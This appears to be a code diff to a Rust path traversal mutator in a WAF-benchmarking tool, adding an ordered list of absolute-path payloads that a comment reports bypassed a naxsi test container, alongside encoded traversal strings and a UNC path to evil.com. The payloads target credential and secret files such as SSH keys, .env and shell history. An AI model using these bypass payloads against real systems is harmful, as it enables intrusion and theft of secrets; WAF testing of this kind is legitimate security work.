@@ -15,7 +15,7 @@
 //! 7. UNC network paths
 //! 8. `/proc/self/root` escape forms
 
-use std::collections::BTreeSet;
+use std::collections::HashSet;
 
 /// Generate semantic-preserving path traversal mutations for a candidate payload.
 #[must_use]
@@ -24,45 +24,97 @@ pub fn mutate(payload: &str) -> Vec<String> {
         return Vec::new();
     }
 
-    let mut results = BTreeSet::new();
+    // Insertion-ordered: callers like bench-waf `take(args.variants)`
+    // the FIRST N results, so priority order matters. We pre-pend the
+    // naxsi-friendly absolute paths so they're always sampled first.
+    let mut results: Vec<String> = Vec::new();
+    let mut seen: HashSet<String> = HashSet::new();
+    let mut push = |v: String, results: &mut Vec<String>, seen: &mut HashSet<String>| {
+        if seen.insert(v.clone()) {
+            results.push(v);
+        }
+    };
     let target = infer_target_path(payload);
 
-    for variant in [
-        "..%2f..%2f..%2fetc/passwd".to_string(),
-        "..%252f..%252f..%252fetc/passwd".to_string(),
-        "%2e%2e/%2e%2e/%2e%2e/etc/passwd".to_string(),
-        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd".to_string(),
-        "../../../etc/passwd%00.jpg".to_string(),
-        "..\\..\\..\\etc\\passwd".to_string(),
-        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd".to_string(),
-        "....//....//....//etc/passwd".to_string(),
-        "..;/..;/..;/etc/passwd".to_string(),
-        "..%00/..%00/..%00/etc/passwd".to_string(),
-        "..\\..\\WINDOWS\\system32".to_string(),
-        "\\\\evil.com\\share".to_string(),
-        "/proc/self/root/etc/passwd".to_string(),
+    // ── No-traversal absolute paths FIRST (naxsi-class WAF bypass) ───
+    // naxsi blocks any `..` sequence; encoded variants too. Plain
+    // absolute paths to non-`passwd` files pass cleanly. Live-confirmed
+    // against the wafrift-bench naxsi container on 2026-05-09:
+    //   /etc/passwd        → 403  (passwd literal flagged)
+    //   ../etc/hosts       → 403  (`..` flagged)
+    //   /proc/self/environ → 200 ✓
+    //   /var/log/auth.log  → 200 ✓
+    //   /.ssh/id_rsa       → 200 ✓
+    //   /.git/config       → 200 ✓
+    for naxsi_friendly in [
+        "/proc/self/environ",
+        "/proc/self/cmdline",
+        "/proc/self/maps",
+        "/proc/version",
+        "/var/log/auth.log",
+        "/var/log/syslog",
+        "/.ssh/id_rsa",
+        "/.ssh/authorized_keys",
+        "/.git/config",
+        "/.git/HEAD",
+        "/.env",
+        "/var/www/html/.env",
+        "/home/user/.bash_history",
+        "/root/.bash_history",
+        "C:/Windows/System32/drivers/etc/hosts",
+        "C:/inetpub/wwwroot/web.config",
     ] {
-        results.insert(variant);
+        push(naxsi_friendly.to_string(), &mut results, &mut seen);
+    }
+
+    // ── Encoded `..` traversal forms (modsec / coraza / generic WAFs) ─
+    for variant in [
+        "..%2f..%2f..%2fetc/passwd",
+        "..%252f..%252f..%252fetc/passwd",
+        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
+        "../../../etc/passwd%00.jpg",
+        "..\\..\\..\\etc\\passwd",
+        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+        "....//....//....//etc/passwd",
+        "..;/..;/..;/etc/passwd",
+        "..%00/..%00/..%00/etc/passwd",
+        "..\\..\\WINDOWS\\system32",
+        "\\\\evil.com\\share",
+        "/proc/self/root/etc/passwd",
+    ] {
+        push(variant.to_string(), &mut results, &mut seen);
     }
 
     if target.contains("windows") || target.contains("system32") {
-        results.insert("..\\..\\WINDOWS\\system32".to_string());
+        push("..\\..\\WINDOWS\\system32".to_string(), &mut results, &mut seen);
     }
 
     if target.contains("/etc/passwd") || target.contains("passwd") {
-        results.insert(format!("../../../{}", target.trim_start_matches('/')));
-        results.insert(format!(
-            "..\\..\\..\\{}",
-            target.trim_start_matches('/').replace('/', "\\")
-        ));
-        results.insert(format!(
-            "/proc/self/root/{}",
-            target.trim_start_matches('/')
-        ));
+        push(
+            format!("../../../{}", target.trim_start_matches('/')),
+            &mut results,
+            &mut seen,
+        );
+        push(
+            format!(
+                "..\\..\\..\\{}",
+                target.trim_start_matches('/').replace('/', "\\")
+            ),
+            &mut results,
+            &mut seen,
+        );
+        push(
+            format!("/proc/self/root/{}", target.trim_start_matches('/')),
+            &mut results,
+            &mut seen,
+        );
     }
 
-    results.remove(payload);
-    results.into_iter().collect()
+    // Drop the original payload from the variant list (we don't want to
+    // re-send it; it's the baseline).
+    results.retain(|v| v != payload);
+    results
 }
 
 /// Detect whether a payload looks like a path traversal probe.
